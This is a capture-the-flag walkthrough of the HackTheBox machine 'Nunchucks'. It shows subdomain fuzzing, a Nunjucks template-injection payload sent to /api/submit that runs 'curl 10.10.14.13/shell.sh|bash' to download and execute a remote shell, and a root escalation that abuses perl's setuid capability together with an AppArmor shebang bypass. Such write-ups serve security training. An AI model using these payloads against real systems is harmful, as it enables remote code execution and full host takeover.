# Nunchucks

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.252
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 04:51 EDT
Nmap scan report for 10.129.95.252
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

We have to add `nunchucks.htb` to our `/etc/hosts` file to access port 80.

### Web Enum

Port 80 reveals an ecommerce platform.

<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Registering is closed:

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

There wasn't much on the website and it looks rather static, so we can do some subdomain and directory fuzzing. Using `wfuzz`, I found out there was a `store` subdomain.

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.nunchucks.htb' --hw=2271 https://nunchucks.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000037:   200        101 L    259 W      4028 Ch     "store"
```

### Email SSTI --> Shell

This was another store:

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

When we submit an email, it would print it back on the screen.

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

The box name was a hint that it was using NUNJUCKS, so we can try some SSTI here. We can verify it works by using `{{7*7}}` as part of the email:

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Using this, we can start to gain a reverse shell using SSTI for RCE. If we analyse the HTTP traffic, we can see that the emails are being sent to `/api/submit` and processed.&#x20;

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Using this, we can start to generate a payload:

{% code overflow="wrap" %}
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('curl 10.10.14.13/shell|bash')")()}}
```
{% endcode %}

Here's the final request I used to get a shell:

{% code overflow="wrap" %}
```http
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=sS5N1jkHeT3qF-BegglaZv_v
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 141
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close



{
    "email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl 10.10.14.13/shell.sh|bash')\")()}}"
}
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

## Privilege Escalation

### Perl Capabilities

Within the `/opt` directory, there's a few files:

```
david@nunchucks:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Oct 28  2021 .
drwxr-xr-x 19 root root 4096 Oct 28  2021 ..
-rwxr-xr-x  1 root root  838 Sep  1  2021 backup.pl
drwxr-xr-x  2 root root 4096 Oct 28  2021 web_backups
```

The first few lines of `backup.pl` stand out to me:

```perl
david@nunchucks:/opt$ cat backup.pl 
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0);
```

It seems that the perl script is able to run `setuid(0)`. This means that it's probably being run as `root` or it just has the capability to do so. We can enumerate this using `getcap`:

```
david@nunchucks:/opt$ getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep
```

This confirms that we can just run this command torun commands and spawn a `root` shell:

```
david@nunchucks:/opt$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root
david@nunchucks:/opt$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
david@nunchucks:/opt$
```

Interestingly, it does not let us spawn a shell. There's an application that is blocking us.&#x20;

### AppArmor Bypass --> Shell

While reading about security programs in Linux, I ran the `aa-status` command and confirmed that AppArmor is running:

```
david@nunchucks:/opt$ aa-status
apparmor module is loaded.
You do not have enough privilege to read the profile set.
```

This program is a kernel enhancement to confine programs to a limited set of resources, thus explaining why `perl` can only run simple commands and we can't spawn shells. There are bugs on Hacktricks that explain how to bypass these using a shebang.

{% embed url="https://bugs.launchpad.net/apparmor/+bug/1911431" %}

We just have to run these:

```bash
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /tmp/test.pl
chmod +x /tmp/test.pl
/tmp/test.pl
```

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
